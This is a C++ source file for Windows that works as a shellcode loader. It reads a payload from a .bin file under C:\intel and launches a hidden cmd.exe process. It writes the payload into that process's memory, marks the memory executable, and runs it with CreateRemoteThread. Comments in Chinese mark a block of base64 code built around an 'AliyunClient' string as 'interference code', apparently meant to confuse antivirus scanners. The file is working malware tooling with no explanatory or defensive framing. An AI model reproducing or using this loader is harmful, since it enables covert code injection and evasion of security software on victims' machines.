#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include	<string>
#include <Shlobj.h>
//#include <algorithm>
#include	<iostream>
//混淆代码 对base64进行操作 encode decode
#pragma region MyRegion 
//---------------------
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";
static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_encode(const char* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];  // store 3 byte of bytes_to_encode
	unsigned char char_array_4[4];  // store encoded character to 4 bytes

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);  // get three bytes (24 bits)
		if (i == 3) {
			// eg. we have 3 bytes as ( 0100 1101, 0110 0001, 0110 1110) --> (010011, 010110, 000101, 101110)
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2; // get first 6 bits of first byte,
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4); // get last 2 bits of first byte and first 4 bit of second byte
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6); // get last 4 bits of second byte and first 2 bits of third byte
			char_array_4[3] = char_array_3[2] & 0x3f; // get last 6 bits of third byte

			for (i = 0; (i < 4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';

	}

	return ret;

}

std::string base64_decode(const std::string& encoded_string) {
	size_t in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]) & 0xff;

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = 0; j < i; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]) & 0xff;

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}
//---------------------
#pragma endregion
int main()
{
#ifdef _WIN64
	HANDLE hFile = CreateFileA("C:\\intel\\w64.bin", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
#else
	HANDLE hFile = CreateFileA("C:\\intel\\w32.bin", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
#endif 
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Open File Error!%d\n", GetLastError());
		char buff[256] = { 0 };
		sprintf_s(buff, "Open File Error!%d", GetLastError());
		MessageBoxA(0, "Open File Error!", buff, 0);
		return -1;
	}
	DWORD dwSize;
	dwSize = GetFileSize(hFile, NULL);
	//干扰代码
	char word[] = "AliyunClient";
	char    buf[] = "aGVsbG8gd29ybGQ=";
	std::string strword = base64_encode(word, sizeof(word));
	std::string base64buf = base64_decode(buf);
	if (strword != base64buf)
		std::string basebuf = base64_encode(strword.c_str(), strword.length());
	//尝试注入到cmd中
	STARTUPINFO   StartupInfo;//创建进程所需的信息结构变量   
	GetStartupInfo(&StartupInfo);
	StartupInfo.lpReserved = NULL;
	StartupInfo.lpDesktop = NULL;
	StartupInfo.lpTitle = NULL;
	StartupInfo.dwX = 0;
	StartupInfo.dwY = 0;
	StartupInfo.dwXSize = 0;
	StartupInfo.dwYSize = 0;
	StartupInfo.dwXCountChars = 500;
	StartupInfo.dwYCountChars = 500;
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = SW_HIDE;
	//说明进程将以隐藏的方式在后台执行   
	StartupInfo.cbReserved2 = 0;
	StartupInfo.lpReserved2 = NULL;
	StartupInfo.hStdInput = stdin;
	StartupInfo.hStdOutput = stdout;
	StartupInfo.hStdError = stderr;
	PROCESS_INFORMATION   piProcess;
	BOOL   bRet;

	TCHAR szPath[MAX_PATH] = { 0 };
	SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, szPath);
	std::wstring	szPathw = szPath;
#ifdef _WIN64
	szPathw.replace(szPathw.find(L"system32"), 8, L"system32\\cmd.exe");
	bRet = CreateProcess(szPathw.c_str(), NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &piProcess);
#else
	szPathw.replace(szPathw.find(L"system32"), 8, L"SysWOW64\\cmd.exe");
	bRet = CreateProcess(szPathw.c_str(), NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &piProcess);
#endif // _WIN64
	if (bRet)
	{
		DWORD dwRead; DWORD threadID; SIZE_T dwWrite; DWORD	oldProtect;
		char* shellcode = (char*)malloc(dwSize);
		PVOID now_exec = VirtualAllocEx(piProcess.hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		ReadFile(hFile, shellcode, dwSize, &dwRead, 0);
		WriteProcessMemory(piProcess.hProcess, now_exec, shellcode, dwSize, &dwWrite);
		VirtualProtectEx(piProcess.hProcess, now_exec, dwSize, PAGE_EXECUTE, &oldProtect); Sleep(2000);
		CreateRemoteThread(piProcess.hProcess, NULL, NULL, (PTHREAD_START_ROUTINE)now_exec, 0, NULL, &threadID);
	}
	if (strword != base64buf)
		strword = base64_encode(base64buf.c_str(), base64buf.length());
	else
		strword = base64_encode(strword.c_str(), strword.length());
	CloseHandle(hFile);
	return 0;
}